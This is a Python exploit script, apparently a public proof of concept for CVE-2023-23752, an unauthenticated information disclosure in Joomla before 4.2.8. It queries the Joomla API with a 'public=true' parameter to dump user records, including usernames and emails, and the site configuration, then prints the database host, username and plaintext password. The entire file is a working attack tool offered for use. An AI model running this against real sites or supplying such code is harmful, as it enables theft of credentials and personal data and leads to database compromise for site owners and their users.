#!/usr/bin/env python3

import json
import requests
from docopt import docopt
from termcolor import colored

doc = """
  {bold}Joomla! < 4.2.8 - Unauthenticated information disclosure{reset}

  {red}Usage:{reset}
    {script} <url> [options]
    {script} -h | --help

  {red}Parameters:{reset}
    <url>       Root URL (base path) including HTTP scheme, port and root folder

  {red}Options:{reset}
    --debug     Display arguments
    --no-color  Disable colorized output (NO_COLOR environment variable is respected too)
    -h, --help  Show this screen

  {red}Examples:{reset}
    {script} http://127.0.0.1:4242
    {script} https://example.org/subdir

  {red}Project:{reset}
    {underline}author{reset} (https://pwn.by/noraj / https://twitter.com/noraj_rawsec)
    {underline}company{reset} (https://www.acceis.fr / https://twitter.com/acceis)
    {underline}source{reset} (https://github.com/Acceis/exploit-CVE-2023-23752)
"""

def fetch_users(root_url, session):
    vuln_url = f"{root_url}/api/index.php/v1/users?public=true"
    response = session.get(vuln_url)
    return response.text

def parse_users(root_url, session):
    data_json = fetch_users(root_url, session)
    data = json.loads(data_json)['data']
    users = []
    for user in data:
        if user['type'] == 'users':
            user_attributes = user['attributes']
            users.append({
                'id': user_attributes['id'],
                'name': user_attributes['name'],
                'username': user_attributes['username'],
                'email': user_attributes['email'],
                'groups': user_attributes['group_names']
            })
    return users

def display_users(root_url, session):
    users = parse_users(root_url, session)
    print(colored('Users', 'red', attrs=['bold']))
    for user in users:
        print(f"[{user['id']}] {user['name']} ({colored(user['username'], 'yellow')}) - {user['email']} - {user['groups']}")

def fetch_config(root_url, session):
    vuln_url = f"{root_url}/api/index.php/v1/config/application?public=true"
    response = session.get(vuln_url)
    return response.text

def parse_config(root_url, session):
    data_json = fetch_config(root_url, session)
    data = json.loads(data_json)['data']
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = list(entry['attributes'].keys())[0]
            config[key] = entry['attributes'][key]
    return config

def display_config(root_url, session):
    config = parse_config(root_url, session)
    print(colored('Site info', 'red', attrs=['bold']))
    print(f"Site name: {config['sitename']}")
    print(f"Editor: {config['editor']}")
    print(f"Captcha: {config['captcha']}")
    print(f"Access: {config['access']}")
    print(f"Debug status: {config['debug']}\n")
    print(colored('Database info', 'red', attrs=['bold']))
    print(f"DB type: {config['dbtype']}")
    print(f"DB host: {config['host']}")
    print(f"DB user: {colored(config['user'], 'yellow', attrs=['bold'])}")
    print(f"DB password: {colored(config['password'], 'yellow', attrs=['bold'])}")
    print(f"DB name: {config['db']}")
    print(f"DB prefix: {config['dbprefix']}")
    print(f"DB encryption {config['dbencryption']}")

def main():
    args = docopt(doc)
    if args['--no-color']:
        print(colored('Color output disabled', 'yellow'))

    with requests.Session() as session:
        if args['--debug']:
            print(args)
        display_users(args['<url>'], session)
        print()
        display_config(args['<url>'], session)

if __name__ == "__main__":
    main()
